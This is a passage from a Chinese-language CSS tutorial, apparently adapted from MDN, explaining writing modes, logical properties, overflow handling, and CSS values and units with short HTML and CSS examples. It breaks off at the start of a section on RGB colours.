id="2-4-处理不同方向的文本"><a href="#2-4-处理不同方向的文本" class="headerlink" title="2.4  处理不同方向的文本"></a>2.4  处理不同方向的文本</h3><p>目前为止我们在 CSS 学习中遇到的许多属性和属性值与显示器的物理尺度紧密相关。例如，我们会在上、右、下、左设置边框。这些物理尺寸与水平排布的文本相得益彰，并且，默认浏览器对方向从左到右的文本（如英文或法文）的支持，要优于从右到左的文本（如阿拉伯语）的支持。</p><p>然而，CSS 在最近几年得到了改进，以更好地支持不同方向的文本，包括从右到左，也包括从上到下的文本（如日文）——这些不同的方向属性被称为书写模式。随着学习的深入，当你开始试着对页面进行布局时，对书写模式的了解将会对你很有帮助，为此我们在这里加以介绍。</p><h4 id="什么是书写模式"><a href="#什么是书写模式" class="headerlink" title="什么是书写模式"></a>什么是书写模式</h4><p>CSS 中的书写模式是指文本的排列方向是横向还是纵向的。<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/writing-mode"><code>writing-mode</code></a> 属性使我们从一种模式切换到另一种模式。为此，你不必使用一种竖向的语言——你还可以更改部分文字的方向以实现创新性的布局。</p><p>我们可以使用<code>writing-mode: vertical-rl</code>对一个标题的显示进行设置。现在，标题文本是竖向的了。竖向文本在平面设计中很常见，也可以为你的网页设计增添更加有趣的外观。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/writing-mode"><code>writing-mode</code></a>的三个值分别是：</p><ul><li><code>horizontal-tb</code>: 块流向从上至下。对应的文本方向是横向的。</li><li><code>vertical-rl</code>: 块流向从右向左。对应的文本方向是纵向的。</li><li><code>vertical-lr</code>: 块流向从左向右。对应的文本方向是纵向的。</li></ul><p>因此，<code>writing-mode</code>属性实际上设定的是页面上块级元素的显示方向——要么是从上到下，要么是从右到左，要么是从左到右。而这决定了文本的方向。</p><h4 id="书写模式、块级布局和内联布局"><a href="#书写模式、块级布局和内联布局" class="headerlink" title="书写模式、块级布局和内联布局"></a>书写模式、块级布局和内联布局</h4><p>我们已经讨论了块级布局和内联布局（<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/The_box_model#block_and_inline_boxes">block and inline layout</a>），也知道外部显示类型元素分为块级元素和内联元素。如上所述，块级显示和内联显示与文本的书写模式（而非屏幕的物理显示）密切相关。如果你使用书写模式的显示是横向的，如英文，那么块在页面上的显示就是从上到下的。</p><p>用一个例子可以更清楚地说明这一点。下一个例子中有两个盒子，分别包含一个标题和一个段落。第一个盒子应用的是<code>writing-mode: horizontal-tb</code>，这是一个从上到下的横向的书写模式。第二个盒子应用的是<code>writing-mode: vertical-rl</code>，这是一个从右到左的纵向的书写模式。</p><p>当我们切换书写模式时，我们也在改变块和内联文本的方向。<code>horizontal-tb</code>书写模式下块的方向是从上到下的横向的，而 <code>vertical-rl</code>书写模式下块的方向是从右到左的纵向的。因此，块维度指的总是块在页面书写模式下的显示方向。而内联维度指的总是文本方向。</p><p>这张图展示了在水平书写模式下的两种维度。<img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Handling_different_text_directions/horizontal-tb.png" alt="img"></p><p>这张图片展示了纵向书写模式下的两种维度。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Handling_different_text_directions/vertical.png" alt="img"></p><p>一旦你开始接触 CSS 布局，尤其是更新的布局方法，这些关于块级元素和内联元素的概念会变得非常重要。我之后会返回来再看。</p><h4 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h4><p>除了书写模式，我们还可以设置文本方向。正如上面所言，有些语言（如阿拉伯语）是横向书写的，但是是从右向左。当你在对页面布局进行创新时，你可能不这么使用——如果你只是想将某部分内容放到右边排列下来，还有其他方法可以选择——然而，重要的是能意识到，这其实是 CSS 本身功能的一部分。网页可不仅限于从左向右排列的语言！</p><p>由于书写模式和文本方向都是可变的，新的 CSS 布局方法不再定义从左到右和从上到下，而是将这些连同内联元素和块级元素的<em>开头</em>和<em>结尾</em>一起考量。现在不必过于担心，但是带着这些概念开始你的布局，你会发现这对你掌握 CSS 非常有用。</p><h4 id="逻辑属性和逻辑值"><a href="#逻辑属性和逻辑值" class="headerlink" title="逻辑属性和逻辑值"></a>逻辑属性和逻辑值</h4><p>我们之所以要在这里探讨书写模式和方向，是因为目前为止我们已经了解了很多与屏幕的物理显示密切相关的很多属性，而书写模式和方向在水平书写模式下会很有意义。</p><p>让我们再来看看那两个盒子——一个用<code>horizontal-tb</code>设定了书写模式，一个用<code>vertical-rl</code>设定了书写模式。我为这两个盒子分别设定了宽度（ <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a>）。可以看到，当盒子处于纵向书写模式下时，宽度也发生了变化，从而导致文本超出了盒子的范围。</p><p>通过这一些列调整，我们想要的实际上是使宽和高随着书写模式一起变化。当处于纵向书写模式之下时，我们希望盒子可以向横向模式下一样得到拓宽。</p><p>为了更容易实现这样的转变，CSS 最近开发了一系列映射属性。这些属性用逻辑（<strong>logical</strong>）和相对变化（<strong>flow relative</strong>）代替了像宽<code>width</code>和高<code>height</code>一样的物理属性。</p><p>横向书写模式下，映射到<code>width</code>的属性被称作内联尺寸（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/inline-size"><code>inline-size</code></a>）——内联维度的尺寸。而映射<code>height</code>的属性被称为块级尺寸（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/block-size"><code>block-size</code></a>），这是块级维度的尺寸。下面的例子展示了替换掉<code>width</code>的<code>inline-size</code>是如何生效的。</p><h4 id="逻辑外边距、边框和内边距属性"><a href="#逻辑外边距、边框和内边距属性" class="headerlink" title="逻辑外边距、边框和内边距属性"></a>逻辑外边距、边框和内边距属性</h4><p>我们在前面两节中学习了 CSS 的盒模型和 CSS 边框。在外边距、边框和内边距属性中，你会发现许多物理属性，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-top"><code>margin-top</code></a>、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-left"><code>padding-left</code></a>和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom"><code>border-bottom</code></a>。就像 width 和 height 有映射，这些属性也有相应的映射。</p><p><code>margin-top</code>属性的映射是<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-block-start"><code>margin-block-start</code></a>——总是指向块级维度开始处的边距。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-left"><code>padding-left</code></a>属性映射到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-inline-start"><code>padding-inline-start</code></a>，这是应用到内联开始方向（这是该书写模式文本开始的地方）上的内边距。<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom"><code>border-bottom</code></a>属性映射到的是<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-block-end"><code>border-block-end</code></a>，也就是块级维度结尾处的边框。</p><p>下面是物理和逻辑属性之间的对比。</p><p><strong>如果你用<code>writing-mode</code>把盒子<code>.box</code>的书写模式改为<code>vertical-rl</code>，你将会看到尽管盒子的物理方向变了，盒子的物理属性仍然没变，然而逻辑属性会随着书写模式一起改变。</strong></p><p><strong>你还可以看到，二级标题<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements">&#96;&#96; (en-US)</a>有一个黑色的底部边框<code>border-bottom</code>。你知道如何使得底部边框无论在那种书写模式下都位于文本的下方吗？</strong></p><p>对于每一个普通边距，都有许多属性可以参考，你可以在 MDN 页面（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Logical_Properties">Logical Properties and Values</a>）查看所有映射属性。</p><p><strong>逻辑值</strong></p><p>目前为止我们看到的都是逻辑属性的名称。还有一些属性的取值是一些物理值（如<code>top</code>、<code>right</code>、<code>bottom</code>和<code>left</code>）。这些值同样拥有逻辑值映射（<code>block-start</code>、<code>inline-end</code>、<code>block-end</code>和<code>inline-start</code>）。</p><p>例如，你可以将一张图片移到左边，并使文本环绕图片。你可以将<code>left</code>替换为<code>inline-start</code> ，就像下面的例子中一样。</p><p><strong>将这个例子的书写模式改为<code>vertical-rl</code>，看看图片会发生什么。将<code>inline-start</code>改为<code>inline-end</code>来改变图片的移动。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box logical&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;big-star.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;star&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This box uses logical properties. The star image has been floated inline-start, it also has a margin on the inline-end and block-end.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">inline-size</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">writing-mode</span>: horizontal-tb;<br>&#125;<br><br><span class="hljs-selector-tag">img</span>&#123;<br>  <span class="hljs-attribute">float</span>: inline-start;<br>  <span class="hljs-attribute">margin-inline-end</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">margin-block-end</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之类，我们同样使用逻辑边距值来保证在任何书写模式下边距的位置都是对的。</p><p><strong>应该使用物理属性还是逻辑属性呢？</strong></p><p>逻辑属性是在物理属性之后出现的，因而最近才开始在浏览器中应用。你可以通过查看 MDN 的属性页面来了解浏览器对逻辑属性的支持情况。如果你并没有应用多种书写模式，那么现在你可能更倾向于使用物理属性，因为这些在你使用弹性布局和网格布局时非常有用。</p><h3 id="2-5-溢出的内容"><a href="#2-5-溢出的内容" class="headerlink" title="2.5 溢出的内容"></a>2.5 溢出的内容</h3><p>本节课，我们来了解一下 CSS 中另外一个重要的概念——<strong>溢出</strong>。溢出是在盒子无法容纳下太多的内容的时候发生的。在这篇教程里面，你将会学习到什么是溢出，以及如何控制它。</p><h4 id="什么是溢出？"><a href="#什么是溢出？" class="headerlink" title="什么是溢出？"></a>什么是溢出？</h4><p>我们知道，CSS 中万物皆盒，因此我们可以通过给<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/height"><code>height</code></a>（或者 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/inline-size"><code>inline-size</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/block-size"><code>block-size</code></a>）赋值的方式来约束盒子的尺寸。溢出是在你往盒子里面塞太多东西的时候发生的，所以盒子里面的东西也不会老老实实待着。CSS 给了你好几种工具来控制溢出，在学习的早期理解这些概念是很有用的。在你写 CSS 的时候你经常会遇到溢出的情形，尤其是当你以后更加深入到 CSS 布局的时候。</p><h4 id="CSS-尽力减少“数据损失”"><a href="#CSS-尽力减少“数据损失”" class="headerlink" title="CSS 尽力减少“数据损失”"></a>CSS 尽力减少“数据损失”</h4><p>我们从两个展示了在碰到溢出的时候，CSS 默认会如何处理的例子开始吧。</p><p>第一个例子是，一个盒子，在块方向上已经受到<code>height</code>的限制。然后我们已经加了过多的内容，以至于盒子里面没有空间容纳。内容正在从盒子里面溢出，并让自己把盒子下面的段落弄得一团糟。</p><p>第二个例子是一个单词，位于在内联方向上受到限制的盒子里面。盒子已经被做得小到无法放置那个单词的地步，于是那个单词就突破了盒子的限制。</p><p>你也许会好奇，为什么 CSS 默认会采取如此不整洁的方式，让内容这么凌乱地溢出出来呢？为何不把多余的内容隐藏起来，或者让盒子变大呢？</p><p>只要有可能，CSS 就不会隐藏你的内容，隐藏引起的数据损失通常会造成困扰。在 CSS 的术语里面，这会导致一些内容消失，你的访客可能不会注意到这一点，如果消失的是表格上的提交按钮，没有人能填完这个表格，这是很麻烦的事情！所以 CSS 反而会把它以可见的形式溢出出去。这样做的结果就是，你会看到错误的 CSS 导致的一片混乱，或者最坏的情况也只是你的网站的访客会告诉你有些内容冒了出来，你的网站需要修缮。</p><p>如果你已经用<code>width</code>或者<code>height</code>限制住了一个盒子，CSS 假定，你知道你在做什么，而且你已经控制住了溢出的隐患。总之，在盒子里面需要放置文本的时候，限制住块方向的尺寸是会引起问题的，因为可能会有比你在设计网站的时候所预计的文本更多的文本，或者文本变大了——比如用户增加字体大小的时候。</p><p>在下面的几节课里，我们会看一下各种不同的控制尺寸的方式，以减少溢出的影响。但是，如果你需要固定的尺寸，你也可以控制溢出表现的形式。那么让我们接着读下去吧！</p><p><strong>overflow 属性</strong></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow"><code>overflow</code></a>属性是你控制一个元素溢出的方式，它告诉浏览器你想怎样处理溢出。<code>overflow</code>的默认值为<code>visible</code>，这就是我们的内容溢出的时候，我们在默认情况下看到它们的原因。</p><p>如果你想在内容溢出的时候把它裁剪掉，你可以在你的盒子上设置<code>overflow: hidden</code>。这就会像它表面上所显示的那样作用——隐藏掉溢出。这可能会很自然地让东西消失掉，所以你只应该在判断隐藏内容不会引起问题的时候这样做。</p><p>也许你还会想在有内容溢出的时候加个滚动条？如果你用了<code>overflow: scroll</code>，那么你的浏览器总会显示滚动条，即使没有足够多引起溢出的内容。你可能会需要这样的样式，它避免了滚动条在内容变化的时候出现和消失。</p><p><strong>如果你移除了下面的盒子里的一些内容，你可以看一下，滚动条是否还会在没有能滚动的东西的时候保留。</strong></p><p>在以上的例子里面，我们仅仅需要在<code>y</code>轴方向上滚动，但是我们在两个方向上都有了滚动条。你可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow-y"><code>overflow-y</code></a>属性，设置<code>overflow-y: scroll</code>来仅在<code>y</code>轴方向滚动。</p><p>你也可以用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow-x"><code>overflow-x</code></a>，以在 x 轴方向上滚动，尽管这不是处理长英文词的好办法！如果你真的需要在小盒子里面和长英文词打交道，那么你可能要了解一下<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/word-break"><code>word-break</code></a>或者<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow-wrap"><code>overflow-wrap</code></a>属性。除此以外，一些<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Sizing_items_in_CSS">在 CSS 里面调整大小</a>这节课里面讨论过的方式可能会帮助你创建可以和有变化容量的内容相协调的盒子。</p><p>和<code>scroll</code>一样，在无论是否有多到需要 用滚动条的内容的时候，页面上都会显示一个滚动条。</p><p><strong>备注：</strong> 你可以用<code>overflow</code>属性指定 x 轴和 y 轴方向的滚动，同时使用两个值进行传递。如果指定了两个关键字，第一个对<code>overflow-x</code>生效而第二个对<code>overflow-y</code>生效。否则，<code>overflow-x</code>和<code>overflow-y</code>将会被设置成同样的值。例如，<code>overflow: scroll hidden</code>会把<code>overflow-x</code>设置成<code>scroll</code>，而<code>overflow-y</code>则为<code>hidden</code>。</p><p>如果你只是想让滚动条在有比盒子所能装下更多的内容的时候才显示，那么使用<code>overflow: auto</code>。此时由浏览器决定是否显示滚动条。桌面浏览器一般仅仅会在有足以引起溢出的内容的时候这么做。</p><p>移除一些内容，直到能够装在盒子里面，你还会看到滚动条消失了。</p><h4 id="溢出建立了块级排版上下文"><a href="#溢出建立了块级排版上下文" class="headerlink" title="溢出建立了块级排版上下文"></a>溢出建立了块级排版上下文</h4><p>CSS 中有所谓<strong>块级排版上下文</strong>（Block Formatting Context，BFC）<strong>的概念</strong>。现在你不用太过在意，但是你应该知道，在你使用诸如<code>scroll</code>或者<code>auto</code>的时候，你就建立了一个块级排版上下文。结果就是，你改变了<code>overflow</code>的值的话，对应的盒子就变成了更加小巧的状态。在容器之外的东西没法混进容器内，也没有东西可以突出盒子，进入周围的版面。激活了滚动动作，你的盒子里面所有的内容会被收纳，而且不会遮到页面上其他的物件，于是就产生了一个协调的滚动体验。</p><h4 id="网页设计时不需要的溢出"><a href="#网页设计时不需要的溢出" class="headerlink" title="网页设计时不需要的溢出"></a>网页设计时不需要的溢出</h4><p>现代网页布局的方式（正如<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout">CSS layout</a>模块中所介绍的那些）可以很好地处理溢出。我们不一定能预料到网页上会有多少内容，人们很好地设计它们，使得它们能与这种现状协调。但是在以往，开发者会更多地使用固定高度，尽力让毫无关联的盒子的底部对齐。这是很脆弱的，在旧时的应用里面，你偶尔会遇到一些盒子，它们的内容遮到了页面上的其他内容。如果你看到了，那么你现在应该知道，这就是溢出，理论上你应该能重新排布这些布局，使得它不必依赖于盒子尺寸的调整。</p><p>在开发网站的时候，你应该一直把溢出的问题挂在心头，你应该用或多或少的内容测试设计，增加文本的字号，确保你的 CSS 可以正常地协调。改变溢出属性的值，来隐藏内容或者增加滚动条，会是你仅仅在少数特别情况下需要的，例如在你确实需要一个可滚动盒子的时候。</p><h3 id="2-6-css的值与单位"><a href="#2-6-css的值与单位" class="headerlink" title="2.6 css的值与单位"></a>2.6 css的值与单位</h3><p>CSS 中使用的每个属性都允许拥有一个或一组值，查看 MDN 上的任何属性页将帮助你理解对任何特定属性有效的值。在本节课中，我们将学习一些最常用的值和单位。</p><h4 id="什么是-CSS-的值？"><a href="#什么是-CSS-的值？" class="headerlink" title="什么是 CSS 的值？"></a>什么是 CSS 的值？</h4><p>在 CSS 规范和 MDN 的属性页上，你将能够发现值的存在，因为它们将被尖括号包围，如<code>&lt;color&gt;</code>或<code>&lt;length&gt;</code>。当你看到值<code>&lt;color&gt;</code>对特定属性有效时，这意味着你可以使用任何有效的颜色作为该属性的值，如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color_value">&#96;&#96;</a>参考页面所列。</p><p><strong>备注：</strong> 你还将看到被称为数据类型的 CSS 值。这些术语基本上是可以互换的——当你在 CSS 中看到一些被称为数据类型的东西时，它实际上只是一种表示值的奇特方式。</p><p><strong>备注：</strong> 是的，CSS 值倾向于使用尖括号表示，以区别于 CSS 属性 (例如<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color"><code>color</code></a>属性和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color_value"></a> 数据类型)。你可能还会混淆 CSS 数据类型和 HTML 元素，因为它们都使用尖括号，但这不太可能——它们在完全不一样的上下文中使用。</p><p>在下面的例子中，我们使用关键字设置标题的颜色，使用<code>rgb()</code>函数设置背景：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">color</span>: black;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">197</span>,<span class="hljs-number">93</span>,<span class="hljs-number">161</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>CSS 中的值类型是一种定义了一些可使用的值的集合的方式。这意味着如果你看到的 <code>&lt;color&gt;</code> 是有效的，那么你就不需要考虑可以使用哪种类型——不管是关键字、十六进制值还是 <code>rgb()</code> 函数等都是有效的。如果浏览器支持这些可用的 <code>&lt;color&gt;</code> 值，则可以使用它们当中的任意一个。MDN 上针对每个值类型的页面将提供有关浏览器支持的信息。例如，如果你查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color_value">&#96;&#96;</a> 的页面，你将看到浏览器兼容性部分列出了不同类型的颜色值以及对它们的支持。</p><p>让我们来看看你可能经常遇到的一些值和单位类型，并提供一些示例，以便你尝试使用各种值的可能性。</p><h4 id="数字，长度和百分比"><a href="#数字，长度和百分比" class="headerlink" title="数字，长度和百分比"></a>数字，长度和百分比</h4><p>你可能会发现自己在 CSS 中使用了各种数值数据类型。以下全部归类为数值：</p><table><thead><tr><th align="left">数值类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/integer"><code>&lt;integer&gt;</code></a></td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/integer"><code>&lt;integer&gt;</code></a>是一个整数，比如 1024 或 -55。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/number"><code>&lt;number&gt;</code></a></td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/number"><code>&lt;number&gt;</code></a>表示一个小数——它可能有小数点后面的部分，也可能没有，例如 0.255、128 或 -1.2。</td></tr><tr><td align="left"><code>&lt;dimension&gt;</code></td><td align="left"><code>&lt;dimension&gt;</code>是一个<code>&lt;number&gt;</code>，它有一个附加的单位，例如 45deg、5s 或 10px。<code>&lt;dimension&gt;</code>是一个伞形类别，包括<code>&lt;length&gt;</code>、<code>&lt;angle&gt;</code>、<code>&lt;time&gt;</code>和<code>&lt;resolution&gt;</code>类型。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/percentage"><code>percentage</code></a></td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/percentage"><code>percentage</code></a>表示一些其他值的一部分，例如 50%。百分比值总是相对于另一个量，例如，一个元素的长度相对于其父元素的长度。</td></tr></tbody></table><h4 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h4><p>最常见的数字类型是<code>&lt;length&gt;</code>，例如 10px(像素) 或 30em。CSS 中有两种类型的长度——相对长度和绝对长度。重要的是要知道它们之间的区别，以便理解他们控制的元素将变得有多大。</p><h4 id="绝对长度单位"><a href="#绝对长度单位" class="headerlink" title="绝对长度单位"></a>绝对长度单位</h4><p>以下都是<strong>绝对</strong>长度单位——它们与其他任何东西都没有关系，通常被认为总是相同的大小。</p><table><thead><tr><th align="left">单位</th><th align="left">名称</th><th align="left">等价换算</th></tr></thead><tbody><tr><td align="left"><code>cm</code></td><td align="left">厘米</td><td align="left">1cm &#x3D; 96px&#x2F;2.54</td></tr><tr><td align="left"><code>mm</code></td><td align="left">毫米</td><td align="left">1mm &#x3D; 1&#x2F;10th of 1cm</td></tr><tr><td align="left"><code>Q</code></td><td align="left">四分之一毫米</td><td align="left">1Q &#x3D; 1&#x2F;40th of 1cm</td></tr><tr><td align="left"><code>in</code></td><td align="left">英寸</td><td align="left">1in &#x3D; 2.54cm &#x3D; 96px</td></tr><tr><td align="left"><code>pc</code></td><td align="left">十二点活字</td><td align="left">1pc &#x3D; 1&#x2F;6th of 1in</td></tr><tr><td align="left"><code>pt</code></td><td align="left">点</td><td align="left">1pt &#x3D; 1&#x2F;72th of 1in</td></tr><tr><td align="left"><code>px</code></td><td align="left">像素</td><td align="left">1px &#x3D; 1&#x2F;96th of 1in</td></tr></tbody></table><p>这些值中的大多数在用于打印时比用于屏幕输出时更有用。例如，我们通常不会在屏幕上使用 cm。惟一一个你经常使用的值，估计就是 px(像素)。</p><h4 id="相对长度单位"><a href="#相对长度单位" class="headerlink" title="相对长度单位"></a>相对长度单位</h4><p>相对长度单位相对于其他一些东西，比如父元素的字体大小，或者视图端口的大小。使用相对单位的好处是，经过一些仔细的规划，你可以使文本或其他元素的大小与页面上的其他内容相对应。下表列出了 web 开发中一些最有用的单位。</p><table><thead><tr><th align="left">单位</th><th align="left">相对于</th></tr></thead><tbody><tr><td align="left"><code>em</code></td><td align="left">在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width</td></tr><tr><td align="left"><code>ex</code></td><td align="left">字符“x”的高度</td></tr><tr><td align="left"><code>ch</code></td><td align="left">数字“0”的宽度</td></tr><tr><td align="left"><code>rem</code></td><td align="left">根元素的字体大小</td></tr><tr><td align="left"><code>lh</code></td><td align="left">元素的 line-height</td></tr><tr><td align="left"><code>vw</code></td><td align="left">视窗宽度的 1%</td></tr><tr><td align="left"><code>vh</code></td><td align="left">视窗高度的 1%</td></tr><tr><td align="left"><code>vmin</code></td><td align="left">视窗较小尺寸的 1%</td></tr><tr><td align="left"><code>vmax</code></td><td align="left">视图大尺寸的 1%</td></tr></tbody></table><h4 id="ems-and-rems"><a href="#ems-and-rems" class="headerlink" title="ems and rems"></a>ems and rems</h4><p><code>em</code>和<code>rem</code>是你在从框到文本调整大小时最常遇到的两个相对长度。了解这些方法是如何工作的以及它们之间的区别是很有意义的，尤其是当你开始学习更复杂的主题时，比如样式化文本或 CSS 布局。下面的示例提供了一个演示。</p><p>HTML 是一组嵌套的列表—我们总共有三个列表，并且两个示例都有相同的 HTML。唯一的区别是第一个类具有 ems，第二个类具有 rems。</p><p>首先，我们将 16px 设置为<code>&lt;html&gt;</code>元素的字体大小。</p><p>概括地说，在排版属性中 em 单位的意思是“父元素的字体大小”。带有 ems 类的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul"><code>&lt;ul&gt;</code></a>内的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li"><code>&lt;li&gt;</code></a>元素从它们的父元素中获取大小。因此，每一个连续的嵌套级别都会逐渐变大，因为每个嵌套的字体大小都被设置为 1.3em—是其父嵌套字体大小的 1.3 倍。</p><p>概括地说，rem 单位的意思是“根元素的字体大小”。(“根 em”的 rem 标准。)<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul"><code>&lt;ul&gt;</code></a>内的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li"><code>&lt;li&gt;</code></a>元素和一个 rems 类从根元素 (<code>&lt;html&gt;)</code>中获取它们的大小。这意味着每一个连续的嵌套层都不会不断变大。</p><p>但是，如果你在 CSS 中更改<html>字体大小，你将看到所有其他相关内容都发生了更改，包括 rem 和 em 大小的文本。</p><h4 id="百分比"><a href="#百分比" class="headerlink" title="百分比"></a>百分比</h4><p>在许多情况下，百分比与长度的处理方法是一样的。百分比的问题在于，它们总是相对于其他值设置的。例如，如果将元素的字体大小设置为百分比，那么它将是元素父元素字体大小的百分比。如果使用百分比作为宽度值，那么它将是父值宽度的百分比。</p><p>在下面的示例中，两个百分比大小的框和两个像素大小的框具有相同的类名。分别为 200px 和 40% 宽。</p><p>不同之处在于，第二组两个框位于一个 400 像素宽的包装器中。第二个 200px 宽的盒子和第一个一样宽，但是第二个 40% 的盒子现在是 400px 的 40%——比第一个窄多了！</p><p>尝试更改包装器的宽度或百分比值，看看这是如何工作的。</p><p>注意，虽然许多值接受长度或百分比，但也有一些值只接受长度。你可以在 MDN 属性引用页面上看到它能接受哪些值。如果允许的值包括<code>&lt;length-percent&gt;</code>，则可以使用长度或百分比。如果允许的值只包含<length>，则不可能使用百分比。</p><h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><p>有些值接受数字，不添加任何单位。接受无单位数字的属性的一个例子是不透明度属性（<code>opacity</code> ），它控制元素的不透明度 (它的透明程度)。此属性接受 0(完全透明) 和 1(完全不透明) 之间的数字。</p><p>在下面的示例中，尝试将不透明度值更改为 0 到 1 之间的各种小数值，并查看框及其内容是如何变得透明或者不透明的。</p><h4 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h4><p>在 CSS 中指定颜色的方法有很多，其中一些是最近才实现的。在 CSS 中，相同的颜色值可以在任何地方使用，无论你指定的是文本颜色、背景颜色还是其他颜色。</p><p>现代计算机的标准颜色系统是 24 位的，它允许通过不同的红、绿、蓝通道的组合显示大约 1670 万种不同的颜色，每个通道有 256 个不同的值 (256 x 256 x 256 &#x3D; 16,777,216)。让我们来看看在 CSS 中指定颜色的一些方法。</p><p><strong>备注：</strong> 在本教程中，我们将研究具有良好浏览器支持的常用指定颜色的方法；虽然还有其他的，但是他们没有很好的支持，也不太常见。</p><h4 id="颜色关键词"><a href="#颜色关键词" class="headerlink" title="颜色关键词"></a>颜色关键词</h4><p>在这学习示例或 MDN 上的其他示例中，你经常会看到使用的颜色关键字，因为它们是一种指定颜色的简单易懂的方式。有一些关键词，其中一些有相当有趣的名字！你可以在页面上看到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color_value"><code>&lt;color&gt;</code></a>值的完整列表。</p><p><strong>在下面的示例中尝试使用不同的颜色值，以了解它们是如何工作的。</strong></p><p><strong>十六进制 RGB 值</strong></p><p>你可能遇到的下一种颜色值类型是十六进制代码。每个十六进制值由一个散列&#x2F;磅符号 (#) 和六个十六进制数字组成，每个十六进制数字都可以取 0 到 f(代表 15) 之间的 16 个值中的一个——所以是 0123456789abcdef。每对值表示一个通道—红色、绿色和蓝色—并允许我们为每个通道指定 256 个可用值中的任意一个 (16 x 16 &#x3D; 256)。</p><p>这些值有点复杂，不太容易理解，但是它们比关键字更通用——你可以使用十六进制值来表示你想在配色方案中使用的任何颜色。</p><p><strong>RGB 和 RGBA 